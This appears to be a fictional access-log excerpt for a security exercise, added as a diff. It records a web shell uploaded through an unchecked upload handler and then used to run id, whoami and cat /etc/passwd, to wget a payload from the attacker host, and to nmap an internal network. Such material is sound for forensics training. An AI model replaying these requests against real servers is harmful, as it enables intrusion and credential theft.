@@ -1,0 +1,15 @@
+# Day 19 — web-access.log excerpt (combined log format) from northwind-web. Fictional.
+# format: IP - - [time] "METHOD path HTTP/1.1" status bytes "referer" "user-agent"
+
+198.51.100.7 - - [12/Mar/2025:01:55:11 +0000] "GET /products HTTP/1.1" 200 5120 "-" "Mozilla/5.0"
+198.51.100.7 - - [12/Mar/2025:01:55:14 +0000] "GET /static/app.css HTTP/1.1" 200 880 "-" "Mozilla/5.0"
+203.0.113.66 - - [12/Mar/2025:02:20:51 +0000] "GET /uploads/ HTTP/1.1" 200 410 "-" "curl/7.81.0"
+203.0.113.66 - - [12/Mar/2025:02:21:07 +0000] "POST /uploads/upload.php HTTP/1.1" 200 32 "-" "curl/7.81.0"
+203.0.113.66 - - [12/Mar/2025:02:23:19 +0000] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 44 "-" "curl/7.81.0"
+203.0.113.66 - - [12/Mar/2025:02:23:41 +0000] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 13 "-" "curl/7.81.0"
+203.0.113.66 - - [12/Mar/2025:02:24:55 +0000] "GET /uploads/shell.php?cmd=cat+/etc/passwd HTTP/1.1" 200 2210 "-" "curl/7.81.0"
+203.0.113.66 - - [12/Mar/2025:02:27:02 +0000] "GET /uploads/shell.php?cmd=wget+http://203.0.113.66:8000/ls.tgz+-O+/tmp/ls.tgz HTTP/1.1" 200 0 "-" "curl/7.81.0"
+203.0.113.66 - - [12/Mar/2025:02:39:44 +0000] "GET /uploads/shell.php?cmd=nmap+-sT+10.0.2.0/24 HTTP/1.1" 200 8800 "-" "curl/7.81.0"
+198.51.100.7 - - [12/Mar/2025:08:02:33 +0000] "GET /products HTTP/1.1" 200 5120 "-" "Mozilla/5.0"
+
+# Note (from the app team): /uploads/ should only ever contain images. upload.php has no file-type check.
